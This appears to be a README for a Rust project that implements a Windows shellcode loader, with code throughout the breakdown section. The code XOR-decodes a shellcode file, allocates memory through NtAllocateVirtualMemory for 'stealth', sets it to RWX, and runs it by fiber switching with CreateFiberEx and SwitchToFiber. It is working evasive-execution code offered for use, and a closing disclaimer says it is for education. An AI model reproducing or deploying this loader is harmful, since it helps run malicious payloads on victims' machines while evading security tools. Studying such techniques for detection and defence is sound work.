# Fiber Injection in Rust

## Overview

This project demonstrates a **fiber-based shellcode injection technique** in Rust, leveraging Windows API calls and `ntapi` functions. The method uses `NtAllocateVirtualMemory` for stealthy memory allocation and **Fiber Switching** for execution.

## Features

- Uses **XOR encryption** for shellcode obfuscation.
- Allocates memory using `NtAllocateVirtualMemory` for stealth.
- Uses `NtProtectVirtualMemory` to set memory to `RWX`.
- Executes payload via **fiber switching** using `CreateFiberEx`.
- Alternative method: `HeapAlloc` for simple memory allocation.

## Prerequisites

- **Rust toolchain** installed
- **Windows OS** (Required for Windows API calls)
- `ntapi` and `windows` crates

## Installation

Clone the repository:

```sh
 git clone https://github.com/yourusername/fiber_injection.git
 cd fiber_injection
```

Install dependencies:

```sh
cargo build --release
```

## Code Breakdown

### **1. XOR Shellcode Decryption**

```rust
fn xor_decode(buf: &[u8], key: u8) -> Vec<u8> {
    buf.iter().map(|x| x ^ key).collect()
}
```

- Loads **encoded shellcode** and decrypts it using an XOR key.

### **2. Allocating Virtual Memory (Stealth Mode)**

```rust
unsafe fn allocate_stealthy_virtual_memory(shellcode: &[u8]) -> *mut u8 {
    let mut base_address: *mut c_void = null_mut();
    let mut region_size: usize = shellcode.len();

    let status = NtAllocateVirtualMemory(
        NtCurrentProcess,
        &mut base_address as *mut _,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );

    if status != 0 {
        panic!("NtAllocateVirtualMemory failed! Status: {:#x}", status);
    }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), base_address as *mut u8, shellcode.len());

    if !set_executable(base_address as *mut u8, shellcode.len()) {
        panic!("Failed to change memory permissions to RWX!");
    }

    base_address as *mut u8
}
```

- Allocates memory with `NtAllocateVirtualMemory`.
- Copies the shellcode into allocated memory.
- Calls `set_executable()` to mark the region as `RWX`.

### **3. Making Memory Executable**

```rust
unsafe fn set_executable(mem_ptr: *mut u8, size: usize) -> bool {
    let mut address: *mut _ = mem_ptr as *mut _;
    let mut region_size = size;
    let mut old_protection: u32 = PAGE_READWRITE.0;

    let _ = NtProtectVirtualMemory(
        NtCurrentProcess,
        &mut address,
        &mut region_size,
        PAGE_EXECUTE_READWRITE.0,
        &mut old_protection,
    );
    true
}
```

- Uses `NtProtectVirtualMemory` to change protection to `RWX`.

### **4. Executing Shellcode via Fiber Switching**

```rust
let buf_ptr: LPFIBER_START_ROUTINE = std::mem::transmute(shellcode_ptr);

// Create a Fiber for Execution
let hijacked_fiber = CreateFiberEx(0, 0, 0, buf_ptr, None);
if hijacked_fiber.is_null() {
    panic!("CreateFiberEx failed!");
}

// Convert the Main Thread into a Fiber
let primary_fiber = ConvertThreadToFiber(None);
if primary_fiber.is_null() {
    panic!("ConvertThreadToFiber failed!");
}

// Execute via Fiber Switching
SwitchToFiber(hijacked_fiber);
```

- Converts the thread into a **fiber** and switches execution to shellcode.

## Running the Program

1. Ensure your shellcode is encoded using XOR and placed as `encoded_shellcode.bin` in the project root.
2. Compile and execute:

```sh
cargo run --release
```

## Disclaimer

This project is intended for **educational and research purposes only**. Unauthorized use of this code for malicious activities is strictly prohibited.

## License

[MIT License](LICENSE)

